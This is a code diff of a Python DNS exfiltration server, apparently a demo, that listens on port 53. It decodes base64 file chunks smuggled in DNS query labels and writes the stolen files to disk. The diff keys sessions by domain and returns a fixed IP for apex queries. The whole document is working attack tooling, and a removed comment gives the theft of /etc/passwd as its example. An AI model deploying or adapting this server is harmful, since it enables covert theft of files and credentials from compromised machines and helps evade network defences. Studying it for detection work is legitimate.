@@ -1,53 +1,82 @@
+#!/usr/bin/env python3
+"""
+DNS Exfiltration Server – controlled IP return for apex
+
+Usage:
+    sudo python3 dns_exfil_server.py --domain dnsdemo.andrewrea.co.uk --ip 52.56.139.78
+"""
+
 import os
 import base64
+import argparse
 from dnslib.server import DNSServer, BaseResolver
 from dnslib import RR, QTYPE, A
 
-class ExfiltrationResolver(BaseResolver):
-    sessions = {}
+class ExfilResolver(BaseResolver):
+    def __init__(self, base_domain: str, apex_ip: str):
+        self.base = base_domain.strip(".").lower().split(".")
+        self.sessions = {}  # domain → session metadata
+        self.apex_ip = apex_ip
 
     def resolve(self, request, handler):
         qname = str(request.q.qname).strip(".")
         labels = qname.split(".")
-        src_ip = handler.client_address[0]
+        labels_lc = [l.lower() for l in labels]
 
-        print(f"[+] Query from {src_ip}: {qname}")
-        base_dir = f"exfil_data/{src_ip}"
+        if labels_lc[-len(self.base):] != self.base:
+            return request.reply()  # ignore unrelated
+
+        domain_key = ".".join(self.base)
+        base_dir = os.path.join("exfil_data", domain_key)
         os.makedirs(base_dir, exist_ok=True)
 
-        if labels[0] == "path":
-            # e.g. path.etc_passwd.exfil.dns.local
-            encoded_path = labels[1]
-            file_path = encoded_path.replace("_", "/")
-            self.sessions[src_ip] = {
+        # ───── handle apex (just domain with no subdomain)
+        if len(labels_lc) == len(self.base):
+            reply = request.reply()
+            reply.add_answer(RR(
+                rname=request.q.qname,
+                rtype=QTYPE.A,
+                rclass=1,
+                ttl=60,
+                rdata=A(self.apex_ip)
+            ))
+            return reply
+
+        # ───── session start
+        if labels_lc[0] == "path":
+            file_path = labels[1].replace("_", "/")
+            self.sessions[domain_key] = {
                 "path": file_path,
                 "chunks": {},
-                "last_chunk": -1
+                "last": -1
             }
-            print(f"[+] Session started for {src_ip}, file path: {file_path}")
+            print(f"[+] session start → {file_path}")
 
-        elif labels[0] == "eof":
-            print(f"[✓] EOF received from {src_ip}, writing file...")
-            self.flush_chunks_to_file(src_ip)
+        # ───── eof → write file
+        elif labels_lc[0] == "eof":
+            self._flush(domain_key)
 
-        elif src_ip in self.sessions:
-            session = self.sessions[src_ip]
+        # ───── chunk
+        elif domain_key in self.sessions:
+            session = self.sessions[domain_key]
             try:
-                print(f"[DEBUG] labels: {labels}")
-                index = int(labels[1])                # <chunk>.<index>.<domain>
-                chunk_str = labels[0]
-                padded = chunk_str + "=" * ((4 - len(chunk_str) % 4) % 4)
-                decoded = base64.urlsafe_b64decode(padded)
+                for i, lbl in enumerate(labels):
+                    if lbl.isdigit():
+                        index = int(lbl)
+                        chunk_part = "".join(labels[:i])
+                        break
+                else:
+                    raise ValueError("no numeric index")
 
-                session["chunks"][index] = decoded
-                session["last_chunk"] = max(session["last_chunk"], index)
-                print(f"[✓] Stored chunk {index}, {len(decoded)} bytes")
-
+                padded = chunk_part + "=" * ((4 - len(chunk_part) % 4) % 4)
+                data = base64.urlsafe_b64decode(padded.encode())
+                session["chunks"][index] = data
+                session["last"] = max(session["last"], index)
+                print(f"[✓] chunk {index} ({len(data)} bytes) stored")
             except Exception as e:
-                print(f"[!] Failed to process chunk from {src_ip}: {e}")
-        else:
-            print(f"[!] No active session for IP {src_ip}")
+                print(f"[!] chunk parse error: {e}")
 
+        # ───── default reply
         reply = request.reply()
         reply.add_answer(RR(
             rname=request.q.qname,
@@ -58,38 +87,38 @@ class ExfiltrationResolver(BaseResolver):
         ))
         return reply
 
-    def flush_chunks_to_file(self, ip):
-        session = self.sessions.get(ip)
-        if not session:
-            print(f"[!] No session to flush for {ip}")
+    def _flush(self, key: str):
+        sess = self.sessions.get(key)
+        if not sess:
+            print("[!] flush failed: no session")
             return
 
-        full_path = os.path.join("exfil_data", ip, session["path"].lstrip("/"))
-        os.makedirs(os.path.dirname(full_path), exist_ok=True)
+        out_path = os.path.join("exfil_data", key, sess["path"].lstrip("/"))
+        os.makedirs(os.path.dirname(out_path), exist_ok=True)
 
-        with open(full_path, "wb") as f:
-            for i in range(session["last_chunk"] + 1):
-                chunk = session["chunks"].get(i)
-                if chunk:
-                    print(f"[DEBUG] Writing chunk {i}, {len(chunk)} bytes")
-                    f.write(chunk)
-                else:
-                    print(f"[!] Missing chunk {i}")
+        with open(out_path, "wb") as f:
+            for i in range(sess["last"] + 1):
+                f.write(sess["chunks"].get(i, b""))
 
-        print(f"[✓] File written to: {full_path}")
+        print(f"[✓] wrote file → {out_path}")
 
+# ───── entrypoint
 if __name__ == "__main__":
-    resolver = ExfiltrationResolver()
-    udp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
-    tcp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=True)
+    ap = argparse.ArgumentParser(description="DNS Exfiltration Server")
+    ap.add_argument("--domain", required=True, help="e.g. dnsdemo.andrewrea.co.uk")
+    ap.add_argument("--ip",      required=True, help="IP to return for apex queries")
+    ap.add_argument("--port",    type=int, default=53)
+    args = ap.parse_args()
 
-    print("[*] DNS server started on port 53 (UDP + TCP)")
-    udp_server.start_thread()
-    tcp_server.start_thread()
+    resolver = ExfilResolver(args.domain, args.ip)
+    udp = DNSServer(resolver, port=args.port, address="0.0.0.0", tcp=False)
+    tcp = DNSServer(resolver, port=args.port, address="0.0.0.0", tcp=True)
+
+    print(f"[*] listening on :{args.port} for {args.domain} → IP {args.ip}")
+    udp.start_thread(); tcp.start_thread()
 
     try:
-        while True:
-            pass
+        while True: pass
     except KeyboardInterrupt:
-        print("\n[!] Ctrl+C received.")
+        print("\n[!] shutdown")
 
